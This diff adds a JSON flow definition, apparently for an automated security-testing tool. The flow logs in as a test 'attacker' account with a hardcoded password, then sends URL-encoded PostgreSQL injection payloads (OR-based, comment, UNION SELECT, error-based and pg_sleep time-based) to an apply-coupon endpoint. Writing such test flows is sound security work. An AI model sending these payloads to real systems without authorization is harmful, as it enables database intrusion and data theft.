@@ -1,0 +1,122 @@
+{
+  "id": "flow_sql_injection_apply_coupon_postgres",
+  "name": "SQL Injection: Apply Coupon (Postgres Only)",
+  "description": "Postgres-focused SQLi payloads against the apply-coupon endpoint. Includes baseline, filter-bypass, error-based, and time-based (pg_sleep) payloads.",
+  "headers": {
+    "Accept": "application/json"
+  },
+  "staticVars": {
+    "baseUrl": "https://bla-bypass.ase-team.com",
+    "attackerUsername": "GraceWilson",
+    "attackerPassword": "GracePass7&",
+    "attackerUserId": "00000008-0000-0000-0000-000000000008",
+    "nonexistentOrderId": "ffffffff-ffff-ffff-ffff-ffffffffffff",
+    "baselineCouponCode": "SAVE10",
+    "discoveryProbeCouponCode": "TOOLONG99",
+    "injectionQuerySimple": "%27%20OR%20%271%27%3D%271",
+    "injectionQueryComment": "%27%20OR%201%3D1%20--",
+    "injectionQueryUnion": "%27%20UNION%20SELECT%20*%20FROM%20coupons%20--",
+    "injectionQueryError": "%27",
+    "injectionQuerySleepPostgres": "%27%20OR%20EXISTS%20(SELECT%20pg_sleep(2))%20--%20"
+  },
+  "steps": [
+    {
+      "id": "step_attacker_login_grace_apply_coupon_sqli",
+      "name": "Login GraceWilson",
+      "type": "request",
+      "method": "POST",
+      "url": "{{baseUrl}}/api/auth/login?username={{attackerUsername}}&password={{attackerPassword}}",
+      "onFailure": "stop",
+      "extract": {
+        "attacker_token": "body.access_token"
+      }
+    },
+    {
+      "id": "step_apply_coupon_baseline",
+      "name": "Apply Coupon Baseline (Valid Code)",
+      "type": "request",
+      "method": "POST",
+      "url": "{{baseUrl}}/api/users/{{attackerUserId}}/orders/{{nonexistentOrderId}}/apply-coupon?coupon_code={{baselineCouponCode}}",
+      "headers": {
+        "Authorization": "Bearer {{attacker_token}}"
+      },
+      "onFailure": "stop"
+    },
+    {
+      "id": "step_apply_coupon_discovery_probe",
+      "name": "Apply Coupon Probe (Discovery Pattern Mismatch)",
+      "type": "request",
+      "method": "POST",
+      "url": "{{baseUrl}}/api/users/{{attackerUserId}}/orders/{{nonexistentOrderId}}/apply-coupon?coupon_code={{discoveryProbeCouponCode}}",
+      "headers": {
+        "Authorization": "Bearer {{attacker_token}}"
+      },
+      "onFailure": "continue"
+    },
+    {
+      "id": "step_apply_coupon_injection_simple",
+      "name": "Apply Coupon SQLi (Simple OR)",
+      "type": "request",
+      "method": "POST",
+      "url": "{{baseUrl}}/api/users/{{attackerUserId}}/orders/{{nonexistentOrderId}}/apply-coupon?coupon_code={{injectionQuerySimple}}",
+      "headers": {
+        "Authorization": "Bearer {{attacker_token}}"
+      },
+      "onFailure": "continue"
+    },
+    {
+      "id": "step_apply_coupon_injection_comment",
+      "name": "Apply Coupon SQLi (Comment)",
+      "type": "request",
+      "method": "POST",
+      "url": "{{baseUrl}}/api/users/{{attackerUserId}}/orders/{{nonexistentOrderId}}/apply-coupon?coupon_code={{injectionQueryComment}}",
+      "headers": {
+        "Authorization": "Bearer {{attacker_token}}"
+      },
+      "onFailure": "continue"
+    },
+    {
+      "id": "step_apply_coupon_injection_union",
+      "name": "Apply Coupon SQLi (Union)",
+      "type": "request",
+      "method": "POST",
+      "url": "{{baseUrl}}/api/users/{{attackerUserId}}/orders/{{nonexistentOrderId}}/apply-coupon?coupon_code={{injectionQueryUnion}}",
+      "headers": {
+        "Authorization": "Bearer {{attacker_token}}"
+      },
+      "onFailure": "continue"
+    },
+    {
+      "id": "step_apply_coupon_injection_error",
+      "name": "Apply Coupon SQLi (Error-Based)",
+      "type": "request",
+      "method": "POST",
+      "url": "{{baseUrl}}/api/users/{{attackerUserId}}/orders/{{nonexistentOrderId}}/apply-coupon?coupon_code={{injectionQueryError}}",
+      "headers": {
+        "Authorization": "Bearer {{attacker_token}}"
+      },
+      "onFailure": "continue"
+    },
+    {
+      "id": "step_apply_coupon_injection_sleep_postgres",
+      "name": "Apply Coupon SQLi (Time-Based, Postgres)",
+      "type": "request",
+      "method": "POST",
+      "url": "{{baseUrl}}/api/users/{{attackerUserId}}/orders/{{nonexistentOrderId}}/apply-coupon?coupon_code={{injectionQuerySleepPostgres}}",
+      "headers": {
+        "Authorization": "Bearer {{attacker_token}}"
+      },
+      "onFailure": "continue"
+    }
+  ],
+  "visualLayout": {
+    "step_attacker_login_grace_apply_coupon_sqli": { "x": 50, "y": 50 },
+    "step_apply_coupon_baseline": { "x": 250, "y": 50 },
+    "step_apply_coupon_discovery_probe": { "x": 350, "y": 150 },
+    "step_apply_coupon_injection_simple": { "x": 450, "y": 50 },
+    "step_apply_coupon_injection_comment": { "x": 650, "y": 50 },
+    "step_apply_coupon_injection_union": { "x": 850, "y": 50 },
+    "step_apply_coupon_injection_error": { "x": 450, "y": 150 },
+    "step_apply_coupon_injection_sleep_postgres": { "x": 650, "y": 150 }
+  }
+}
